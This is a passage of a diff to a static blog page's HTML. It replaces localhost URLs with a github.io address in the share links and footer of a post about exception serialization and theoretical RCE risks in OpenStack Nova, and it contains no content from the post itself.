-24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
@@ -540,7 +628,7 @@
     </li>
     <li>
         <a target="_blank" rel="noopener noreferrer" aria-label="share Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned on telegram"
-            href="https://telegram.me/share/url?text=Exception%20Serialization%20Patterns%20in%20OpenStack%20Nova%3a%20Theoretical%20RCE%20Risks%20and%20Lessons%20Learned&amp;url=http%3a%2f%2flocalhost%3a1313%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f">
+            href="https://telegram.me/share/url?text=Exception%20Serialization%20Patterns%20in%20OpenStack%20Nova%3a%20Theoretical%20RCE%20Risks%20and%20Lessons%20Learned&amp;url=https%3a%2f%2fwindshock.github.io%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f">
             <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
                 <path
                     d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
@@ -549,7 +637,7 @@
     </li>
     <li>
         <a target="_blank" rel="noopener noreferrer" aria-label="share Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned on ycombinator"
-            href="https://news.ycombinator.com/submitlink?t=Exception%20Serialization%20Patterns%20in%20OpenStack%20Nova%3a%20Theoretical%20RCE%20Risks%20and%20Lessons%20Learned&u=http%3a%2f%2flocalhost%3a1313%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f">
+            href="https://news.ycombinator.com/submitlink?t=Exception%20Serialization%20Patterns%20in%20OpenStack%20Nova%3a%20Theoretical%20RCE%20Risks%20and%20Lessons%20Learned&u=https%3a%2f%2fwindshock.github.io%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f">
             <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
                 xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
                 <path
@@ -564,7 +652,7 @@
     </main>
     
 <footer class="footer">
-        <span>&copy; 2025 <a href="http://localhost:1313/en/">Code Before Breach</a></span> · 
+        <span>&copy; 2025 <a href="https://windshock.github.io/en/">Code Before Breach</a></span> · 
 
     <span>
         Powered by
